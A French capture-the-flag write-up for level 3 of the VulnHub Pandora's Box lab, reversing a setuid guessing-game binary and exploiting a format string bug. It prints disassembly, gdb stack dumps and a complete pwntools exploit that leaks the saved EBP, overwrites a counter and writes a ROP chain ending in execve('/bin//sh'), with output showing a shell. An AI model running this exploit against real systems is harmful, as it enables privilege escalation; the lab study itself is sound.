# Solution du CTF Pandora's Box de VulnHub (level 3)

Après avoir [écrasé un pointeur dans le heap pour obtenir un write-what-where dans le précédent level](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Pandora's%20Box%20de%20VulnHub%20(levels%201%20et%202).md) nous voici donc face à un autre binaire setuid qui nous donnera les droits de l'utilisateur `level3`.

Un petit coup de `strings` sur le binaire nous bombarde d'information et pour cause : le programme est compilé statiquement et pèse 586 octets !

Le fonctionnement du binaire est le suivant :

```shellsession
$  ./level3
############################
# Random number game - 1.0 #
############################
guess the number between 0 and 40, type exit to close
guess:
```

Une fois ouvert avec mon outil de reverse préféré, `Cutter`, je vois que la fonction `main` ne fait qu'appeller une fonction nommée `start_game` avant d'afficher un message d'au revoir.

Ca semble déjà être un choix de conception tourné vers la possibilité d'écraser une adresse de retour :-P

Cette fonction `start_game` commence par obtenir un chiffre pseudo-aléatoire via une fonction custom que je n'ai pas daigné regarder.

On a aussi au début des variables initialisées dont un compteur mis à 0 et incrémenté à chaque tour. Si il atteint la valeur 7 (nombre de tentatives) on est ejectés.

```nasm
start_game ();
; var unsigned long var_21ch @ ebp-0x21c
; var unsigned long var_218h @ ebp-0x218
; var unsigned long var_214h @ ebp-0x214
; var int32_t var_210h @ ebp-0x210
; var const char *s1 @ ebp-0x20c
; var int32_t canary @ ebp-0xc
; var const char *format @ esp+0x4
; var const char *var_8h @ esp+0x8
; var int32_t var_sp_ch @ esp+0xc
0x0804847c      push    ebp
0x0804847d      mov     ebp, esp
0x0804847f      sub     esp, 0x238
0x08048485      mov     eax, dword gs:[0x14]
0x0804848b      mov     dword [canary], eax
0x0804848e      xor     eax, eax
0x08048490      mov     dword [var_21ch], 0
0x0804849a      mov     dword [var_218h], 0   ; <----------- ici le compteur
0x080484a4      mov     dword [format], 2 ; int32_t arg_4h
0x080484ac      mov     dword [esp], 1 ; int32_t arg_8h
0x080484b3      call    __dup2     ; sym.__dup2
0x080484b8      call    show_welcome ; sym.show_welcome
0x080484bd      mov     dword [esp], 0x28 ; '(' ; 40 ; int32_t arg_8h
0x080484c4      call    random_nr  ; sym.random_nr
0x080484c9      mov     dword [var_214h], eax
0x080484cf      cmp     dword [var_218h], 7 ; <------------- là la comparaison
0x080484d6      jne     0x804850c ; <------------ continue pour d'autres chances
0x080484d8      mov     eax, dword [stderr] ; obj._IO_stderr
                                   ; 0x80ca564
0x080484dd      mov     dword [var_sp_ch], eax
0x080484e1      mov     dword [var_8h], 0xa ; int32_t arg_14h
0x080484e9      mov     dword [format], 1 ; int32_t arg_ch
0x080484f1      mov     dword [esp], str.You_lose ; 0x80abb77 ; int32_t arg_10h <------------ vers la fin de boucle avec un ret 
0x080484f8      call    _IO_fwrite ; sym._IO_fwrite
```

Le programme ne fait rien de plus que faire deviner un nombre : il n'y a aucun shell ou mot de passe révélé si on trouve le bon chiffre.

La lecture de l'input se fait de façon sécurisée via un `readline` (qui retourne directement un pointeur vers une zone allouée dans le tas) puis une conversion en nombre via `strtoint` :

```nasm
0x0804850c      mov     dword [var_8h], str.guess: ; 0x80abb82 ; int32_t arg_10h
0x08048514      mov     dword [format], 0x200 ; 512 ; int32_t arg_ch
0x0804851c      lea     eax, [s1]
0x08048522      mov     dword [esp], eax ; int32_t arg_8h
0x08048525      call    readline   ; sym.readline
0x0804852a      mov     dword [format], str.exit ; 0x80abb8a ; const char *s2
0x08048532      lea     eax, [s1]
0x08048538      mov     dword [esp], eax ; const char *s1
0x0804853b      call    strcmp     ; sym.strcmp ; int strcmp(const char *s1, const char *s2)
0x08048540      test    eax, eax
0x08048542      jne     0x8048553
0x08048544      mov     dword [var_21ch], 1
0x0804854e      jmp     0x8048617
0x08048553      add     dword [var_218h], 1
0x0804855a      lea     eax, [s1]
0x08048560      mov     dword [esp], eax ; int32_t arg_8h
0x08048563      call    strtoint   ; sym.strtoint
0x08048568      mov     dword [var_210h], eax
0x0804856e      mov     eax, dword [var_210h]
0x08048574      cmp     eax, dword [var_214h]
0x0804857a      jle     0x80485b1
0x0804857c      lea     eax, [s1]
0x08048582      mov     dword [var_8h], eax
0x08048586      mov     dword [format], str.Your_guess__s_is_to_high ; 0x80abb8f ; const char *format
0x0804858e      mov     dword [esp], outputbuff ; 0x80cc200 ; char *s
0x08048595      call    sprintf    ; sym.sprintf ; int sprintf(char *s, const char *format, va_list args)  <- HOHOHO
0x0804859a      mov     eax, dword [stderr] ; obj._IO_stderr
                                   ; 0x80ca564
0x0804859f      mov     dword [format], outputbuff ; 0x80cc200 ; const char *format
0x080485a7      mov     dword [esp], eax ; FILE *stream
0x080485aa      call    fprintf    ; sym.fprintf ; int fprintf(FILE *stream, const char *format, void *va_args)
0x080485af      jmp     0x8048617
0x080485b1      mov     eax, dword [var_210h]
0x080485b7      cmp     eax, dword [var_214h]
0x080485bd      jge     0x80485e0
0x080485bf      mov     eax, dword [stderr] ; obj._IO_stderr
                                   ; 0x80ca564
0x080485c4      lea     edx, [s1]
0x080485ca      mov     dword [var_8h], edx
0x080485ce      mov     dword [format], str.Your_guess__s_is_to_low ; 0x80abba9 ; const char *format
0x080485d6      mov     dword [esp], eax ; FILE *stream
0x080485d9      call    fprintf    ; sym.fprintf ; int fprintf(FILE *stream, const char *format, void *va_args)
0x080485de      jmp     0x8048617
0x080485e0      mov     eax, dword [var_210h]
0x080485e6      cmp     eax, dword [var_214h]
0x080485ec      jne     0x8048617
```

Mais à bien regarder on voit que la façon dont l'output est géré quand le chiffre est trop grand est différente de quand le chiffre est trop petit.

En effet, au lieu de faire directement le `fprintf` vers la sortie d'erreur, le programme ajoute un `sprintf` et la chaine générée est alors passée telle quelle à un `fprintf`.

La fonction `sprintf` n'ayant pas de protection contre les buffer overflow on pourrait penser qu'elle constitue l'objectif du level mais à bien regarder le buffer de destination `outputbuff` n'est pas une variable de la stack frame : il est rattaché à l'adresse `0x80cc200`, c'est une variable globale.

Effectivement on peut provoquer un overflow et on obtient un segfault mais le crash survient en plein milieu de la fonction `getenv` donc bien loin du code que l'on a sous les yeux.

En vérité il s'agit bien sûr d'une exploitation de chaine de format car on a le contrôle sur ce qui est passé à `fprintf` :

```shellsession
$ ./level3
############################
# Random number game - 1.0 #
############################
guess the number between 0 and 40, type exit to close
guess: %08x
Your guess %08x is to low
guess: 40%08x
Your guess 40ffd6c54c is to high
```

En passant `40` au début de la chaine on passe le `stroint`, on entre dans le cas du *trop grand* et on déclenche le bug.

Avec une vulnérabilité de format string on peut extraire et écrire des données comme expliqué ici : [Pwing echo : Exploitation d'une faille de chaîne de format](https://devloop.users.sourceforge.net/index.php?article102/pwing-echo-exploitation-d-une-faille-de-chaine-de-format).

## Faites vos jeux

Mais pour réaliser l'exploitation il faut une bonne connaissance de l'état de la stack. Ici j'ai placé un breakpoint sur l'adresse `0x080485af` (juste après le `fprintf` vulnérable) et en afichant 148 dwords à partir de `esp+32` je retrouve toutes les informations qui m'intéressent :

```
guess: 40AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Your guess 40AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA is to high

Breakpoint 1, 0x080485af in start_game ()
(gdb) x/148wx $esp+(8*4)
0xffffca00:     0x00000002      0x0000000d      0x00000028      0x41413034
0xffffca10:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffca20:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffca30:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffca40:     0x00414141      0x00000000      0x00000000      0x00000000
0xffffca50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffca60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffca70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffca80:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffca90:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcaa0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcab0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcac0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcad0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcae0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcaf0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb00:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb10:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb20:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb30:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb40:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb50:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb60:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb70:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb80:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcb90:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcba0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbb0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbc0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbe0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcbf0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcc00:     0x00000000      0x00000000      0x00000000      0x7530fc00
0xffffcc10:     0x0000000c      0x00000000      0xffffcc58      0x08048671
0xffffcc20:     0x00000001      0xffffccf4      0xffffccfc      0x90388544
0xffffcc30:     0xffffcc40      0x08049115      0xffffccf4      0x00000001
0xffffcc40:     0xffffcc58      0x08049177      0x08048d00      0x7530fc00
```

Ainsi la toute première valeur correspond au compteur (ici de valeur 2). Il est très important car on ne parviendra sans doute pas au boût de l'exploitation en 7 coups donc il va falloir écraser sa valeur (si on relance le programme les adresses auront changées en raison de l'ASLR).

Toujours sur la même ligne mais en fin (à esp+44) on voit le début de notre buffer.

Beaucoup plus bas on trouve la valeur du stack cookie : `0x7530fc00`. Cette valeur est aléatoire et change à chaque exécution du programme. Cette valeur dispose toujours d'un octet nul histoire d'embêter les hackers :p

On devinait qu'il y aurait un stack cookie car on avait les instructions suivantes dans le début de la fonction :

```nasm
0x08048485      mov     eax, dword gs:[0x14] ; <-- instruction classique pour obtenir le stack cookie
0x0804848b      mov     dword [canary], eax
```

Situé juste en dessous dans le dump, l'adresse `0x08048671` est l'adresse de retour pour le `main`.

Forcément, juste avant se trouve l'adresse du saved ebp (adresse de base de la précédente stack frame) : `0xffffcc58`.

Si je pose un breakpoint au niveau de l'instruction `ret` de `start_game` et que je regarde l'adresse de esp je vois que 60 octets la sépare de l'adresse de base de la stack frame rétablie :

```
(gdb) b *0x08048648
Breakpoint 2 at 0x8048648
(gdb) c
Continuing.
guess: exit

Breakpoint 2, 0x08048648 in start_game ()
(gdb) info reg esp
esp            0xffffcc1c          0xffffcc1c
(gdb) p 0xffffcc58 - 0xffffcc1c
$1 = 60
```

Mon objectif d'exploitation consiste donc avant tout à faire fuiter l'adresse du saved ebp. Par la suite cette adresse me servira de référence pour calculer les adresses où je veux écrire telles que :

- le compteur à saved ebp - 600

- l'adresse de retour à saved ebp - 60

Le binaire est NX + Canary avec la stack randomisée donc il faut utiliser des ROPs. Comme il est aussi statique il n'y a pas de GOT (donc pas de possibilité de remplacer une adresse de fonction par une autre).

Avec `nm -a` on peut voir tous les symboles dans le binaire mais `system` n'en fait pas partie. On pourrait penser qu'un programme compilé statiquement incorpore bêtement la libc mais même en cherchant la fonction `system` via les opcodes qui devraient la composer je ne l'ai pas retrouvé.

Comme mes skills pour trouver un *stack-pivot* (c'est à dire faire pointer esp vers une stack-frame qu'on aurait créé de toute pièce) ne sont pas au point, je place simplement mon ROP sur l'adresse de retour et ce qui se trouve après et je laisse esp suivre son cours naturel.

## Hammer time

```python
import re
import struct
from pwn import *

ropchain = [
    # setreuid(1003, 1003) by me
    0x080540cd, # pop ecx ; pop ebx ; ret
    1003,
    1003,
    0x080a87d6, # pop eax ; ret
    70, # setreuid syscall number (ref https://x86.syscall.sh/)
    0x08054820, # int 80 ; ret <- trouvé avec ROPgadget via une recherche d'opcodes

    # ropchain generated by ROPgadget that I slightly
    # improved as readline allows null bytes
    0x080540a6, # pop edx ; ret
    0x080ca080, # @ .data
    0x080a87d6, # pop eax ; ret
    struct.unpack("<I", b"/bin")[0],
    0x080797d1, # mov dword ptr [edx], eax ; ret
    0x080540a6, # pop edx ; ret
    0x080ca084, # @ .data + 4
    0x080a87d6, # pop eax ; ret
    struct.unpack("<I", b"//sh")[0],
    0x080797d1, # mov dword ptr [edx], eax ; ret
    0x080540a6, # pop edx ; ret
    0x080ca088, # @ .data + 8
    0x0809807f, # xor eax, eax ; ret
    0x080797d1, # mov dword ptr [edx], eax ; ret
    0x080540ce, # pop ebx ; ret
    0x080ca080, # @ .data
    0x080540cd, # pop ecx ; pop ebx ; ret
    0x080ca088, # @ .data + 8
    0x080ca080, # padding without overwrite ebx
    0x080540a6, # pop edx ; ret
    0x080ca088, # @ .data + 8
    0x080a87d6, # pop eax ; ret
    11, # execve syscall number
    0x08048bdd, # int 0x80
]

# Switch to "process" instructions for local exploitation
# p = process('./level3', stdin=process.PTY, stdout=process.PTY)                                                       
p = remote("192.168.56.83", 44101)

def exec_fmt(payload):
    global p
    try:
        p.readuntil(b"guess: ")
    except EOFError:
        p.close()
        # p = process('./level3', stdin=process.PTY, stdout=process.PTY)
        p = remote("192.168.56.83", 44101)
        p.readuntil(b"guess: ")

    p.sendline(b"40" + payload)
    buff = p.recvline()
    return buff

# Utilise la fonction de callback pour communiquer avec le programme
# FmtStr fait le reste de la magie
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset
info("offset is at dword %d", offset)
p.close()

# p = process('./level3', stdin=process.PTY, stdout=process.PTY)
p = remote("192.168.56.83", 44101)
p.readuntil(b"guess: ")
# dump de saved ebp. Malheureusement pwntools n'offre rien pour extraire les données
# je réutilise un payload similaire à celui du pwntools (obtenu via un simple print dans exec_fmt)
p.sendline(b"40aaaabaaacaaadaaaeaaaSTART%141$08xEND")
buff = p.readlineS()
saved_ebp_addr = int(re.search(r"START(.*)END", buff).group(1), 16)
print(f"Saved EBP = {hex(saved_ebp_addr)}")

# On se débarasse du compteur
print(f"Ecriture de 31337 à l'adresse {saved_ebp_addr - 600:08x}")
autofmt.write(saved_ebp_addr - 600, 31337)
autofmt.execute_writes()
dest_addr = saved_ebp_addr - 60

for offset, value in enumerate(ropchain):
    payload = fmtstr_payload(11, {dest_addr + 4*offset: value}, write_size='byte', numbwritten=15)
    p.sendline(b"40aa" + payload)
    p.readuntil(b"guess: ")

p.sendline(b"exit")
p.interactive()
p.close()
```

Et ça marche :

```shellsession
$ python remote_lvl3.py 
[+] Opening connection to 192.168.56.83 on port 44101: Done
[*] Closed connection to 192.168.56.83 port 44101
[+] Opening connection to 192.168.56.83 on port 44101: Done
[*] Found format string offset: 11
[*] offset is at dword 11
[*] Closed connection to 192.168.56.83 port 44101
[+] Opening connection to 192.168.56.83 on port 44101: Done
Saved EBP = 0xbfec9078
Ecriture de 31337 à l'adresse bfec8e20
[*] Switching to interactive mode
Your guess 40aa--- snip ---\x00\xb0\x90쿱\x90쿳\x90\xec\xbf is to high
guess: $ id
uid=1003(level3) gid=1001(level1) groups=1003(level3),1001(level1)
```

Comme sur le [CTF Pegasus](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20Pegasus%20de%20VulnHub.md) j'ai utilisé `pwntools` qui a correctement trouvé l'offset auquel les données étaient reflétées.

En théorie via `FmtStr` on peut alors simplement spécifier avec la méthode `write` l'adresse où l'on veut écrire et la valeur puis on valide avec `execute_writes`.

Ca a marché effectivement au début mais après j'ai eu encore recours à la méthode plus brute `fmtstr_payload` qui laisse moins de surprises...

*Publié le 26 décembre 2022*


